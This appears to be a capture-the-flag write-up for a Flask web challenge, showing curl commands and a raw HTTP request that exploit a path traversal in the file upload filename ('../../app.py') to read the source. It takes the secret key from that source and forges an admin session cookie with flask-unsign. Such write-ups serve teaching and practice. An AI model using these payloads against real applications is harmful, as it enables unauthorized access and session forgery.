---
title: Watermelon
date: 2024-09-03
author: zacian
tags:
  - Web
draft: false
---

## Description

All love for Watermelons 🍉🍉🍉

Note: The code provided is without jailing, please note that when writing exploits.

`By SAFCSP`

----

Note : While making this writeup, the challenge infrastucture was already closed, so i had to setup the application manually 

## Intuition

From then given attachment or source code files we can find `app.py` which seems to only hold custom api functions or endpoints, other than that there is no templating engine used nor does any HTML or CSS for frontend interaction

So whatever we have to do, is by sending request to backed either using cURL, Burpsuite or Postman. In the following i choosed cURL and Brupsuite

## Solution

First i registerd a user. I did this using Brupsuite but i will show it using cURL request 

```
$ curl -X POST http://127.0.0.1:5000/register \
     -H "Content-Type: application/json" \
     -d '{"username": "user", "password": "password"}'

{"Message":"User registered successfully"}
```

Next let's login and get the session cookie

```
$ curl -v -X POST http://127.0.0.1:5000/login \
     -H "Content-Type: application/json" \
     -d '{"username": "user", "password": "password"}'

.....
< Set-Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InVzZXIifQ.ZtcpMQ.AU0O3djqZQnjygxxk40pp1phmHk; HttpOnly; Path=/
< Connection: close
< 
{"Message":"Login successful"}
```

Now let's check what the profiles endpoint shows

```
$ curl http://127.0.0.1:5000/profile \ 
     -H "Content-Type: application/json" \
     -H "Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InVzZXIifQ.ZtcpMQ.AU0O3djqZQnjygxxk40pp1phmHk;"

{"user_id":2,"username":"user"}
```

so we have a profile id of 2, let's guess that the user_id of admin should be 1. With that in mind let's move forward to the main functionality of the API, that is uploading files

But before we visit the `upload` endpoint let's first check the `files` endpoint

```
$ curl http://127.0.0.1:5000/files \  
     -H "Content-Type: application/json" \
     -H "Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InVzZXIifQ.ZtcpMQ.AU0O3djqZQnjygxxk40pp1phmHk;"

{"files":[]}
```

As we can see, no files is being listed. So now upload a file

First let's create a file `echo HackThePlant > hack.txt`, then let's try to upload it

```
$ curl -X POST http://127.0.0.1:5000/upload \
    -b $'session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InVzZXIifQ.ZtcpMQ.AU0O3djqZQnjygxxk40pp1phmHk;' \                                                  
    -F $'file=@hack.txt'

{"Message":"File uploaded successfully","file_path":"files/2/hack.txt"}
```

After it's uploded successfully let's check our files one more time

```
$ curl http://127.0.0.1:5000/files \
     -H "Content-Type: application/json" \
     -H "Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InVzZXIifQ.ZtcpMQ.AU0O3djqZQnjygxxk40pp1phmHk;" | jq
```

as you can see it's the same command from before but i used `jq` utility to format output into json data, which gives us the followig output

```json
{
  "files": [
    {
      "filename": "hello.txt",
      "filepath": "files/2/hello.txt",
      "id": 1,
      "uploaded_at": "Tue, 03 Sep 2024 15:31:53 GMT"
    }
  ]
}
```

so in order to read the file we just need to provide the file id

```
$ curl http://127.0.0.1:5000/file/1 \
     -H "Content-Type: application/json" \
     -H "Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InVzZXIifQ.ZtcpMQ.AU0O3djqZQnjygxxk40pp1phmHk;"

HackThePlant
```

So how can we use the available feature in-order to read the flag or gain admin or read admin files, well this is possible by simply doing a path traversal

Say for example, the initial `file` directory is in the `app` directory and inside that directory other directories are created that are named with numbers. The main file that is `app.py` is in `app` directory. So we can go back two directories inorder to read the actual `app.py` file

But the question is what would that gives us ? and the answer is `SECRET_KEY`

For this part i used Burpsuite cause i am not that pro in cURL. First i captured the previous upload request using `--proxy http://127.0.0.1:8080`. Upon captureing we can see a POST with the following request and headers

```
POST /upload HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: curl/8.8.0
Accept: */*
Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InVzZXIifQ.ZtcpMQ.AU0O3djqZQnjygxxk40pp1phmHk;
Content-Length: 210
Content-Type: multipart/form-data; boundary=------------------------WuH47fGlYwCHT6cJrXYTOG
Connection: close

--------------------------WuH47fGlYwCHT6cJrXYTOG
Content-Disposition: form-data; name="file"; filename="hack.txt"
Content-Type: text/plain

HackThePlant

--------------------------WuH47fGlYwCHT6cJrXYTOG--
```

now all we have to do is change the filename to something like `filename="../../app.py"`, and on sending the request we don't get any error

```json
{"Message":"File uploaded successfully","file_path":"files/2/../../app.py"}
```

Before trying to read the file we can visit the `files` endpoint to check the id number of the file we uploaded, it's not necessary if you know but since i tested it with quite a number of files, i had to check it

Anyways it was 4 and when i checked `/file/4`, i got the source code available in `app.py`, first thing i checked was at the very end of the code, in the admin section, which holds or returns the flag and i got the same place holder flag that was provided in the public source code

What we got was rather different. In the public code, the secret key is generated by `secrets.token_hex(20)` function but in the original challenge we got it as a hardcoded key string, which we then used to sign our own cookie using `flask-unsign`

```
flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin'}" --secret '8e55dcf0df3722bd29b6c8b4f1d1f934'
```

The secret used in the above was the original key used when the challenge was live, after getting the cookie we can read the flag by simply visiting `/admin` endpoint